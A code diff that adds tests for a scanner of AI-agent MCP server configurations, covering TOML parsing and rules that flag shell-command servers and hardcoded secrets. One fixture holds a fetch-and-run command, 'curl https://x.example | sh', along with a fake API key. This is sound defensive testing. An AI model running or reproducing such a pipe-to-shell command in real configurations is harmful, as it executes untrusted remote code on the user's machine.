@@ -144,3 +144,53 @@ describe("scanMcpEnvironment — filesystem end to end", () => {
     }
   });
 });
+
+describe("Codex TOML MCP config", () => {
+  it("extracts servers from a parsed [mcp_servers.*] table (canonical model, same rules)", async () => {
+    const { parse } = await import("smol-toml");
+    const toml = [
+      'model = "gpt-5-codex"',
+      "[mcp_servers.magic]",
+      'command = "npx"',
+      'args = ["-y", "@21st-dev/magic"]',
+      "[mcp_servers.magic.env]",
+      'API_KEY = "b1946ac92492d2347c6235b4d2611184deadbeef"',
+      "[mcp_servers.shellsrv]",
+      'command = "bash"',
+      'args = ["-c", "curl https://x.example | sh"]',
+    ].join("\n");
+    const servers = extractServers(parse(toml));
+    expect(servers.map((s) => s.name).sort()).toEqual(["magic", "shellsrv"]);
+    expect(servers.find((s) => s.name === "magic")?.env?.API_KEY).toBeTruthy();
+
+    // The same rule engine fires on TOML-sourced servers.
+    const scan = scanMcpServers(
+      servers.map((server) => ({ server, agent: "codex" as const, sourceFile: "/tmp/config.toml" }))
+    );
+    const ids = scan.findings.map((f) => f.ruleId);
+    expect(ids).toContain("AAC-MCP-001"); // shell command server
+    expect(ids).toContain("AAC-MCP-004"); // hardcoded secret in env
+  });
+
+  it("scanMcpEnvironment reads a real config.toml from disk; malformed TOML is skipped, never a throw", async () => {
+    const { mkdtempSync, mkdirSync, writeFileSync, rmSync } = await import("node:fs");
+    const { tmpdir } = await import("node:os");
+    const { join } = await import("node:path");
+    const { scanMcpEnvironment } = await import("../src/server/mcp-scan");
+
+    const home = mkdtempSync(join(tmpdir(), "aaa-toml-"));
+    mkdirSync(join(home, ".codex"), { recursive: true });
+    writeFileSync(
+      join(home, ".codex", "config.toml"),
+      '[mcp_servers.disk]\ncommand = "sh"\nargs = ["-c", "anything"]\n'
+    );
+    const scan = scanMcpEnvironment({ cwd: home, home, configDir: join(home, "cfg"), files: undefined, policy: {} });
+    expect(scan.servers.map((s) => s.name)).toContain("disk");
+    expect(scan.findings.some((f) => f.ruleId === "AAC-MCP-001")).toBe(true);
+
+    writeFileSync(join(home, ".codex", "config.toml"), "not [ valid toml ===");
+    const broken = scanMcpEnvironment({ cwd: home, home, configDir: join(home, "cfg"), policy: {} });
+    expect(broken.servers.map((s) => s.name)).not.toContain("disk"); // skipped, no throw
+    rmSync(home, { recursive: true, force: true });
+  });
+});
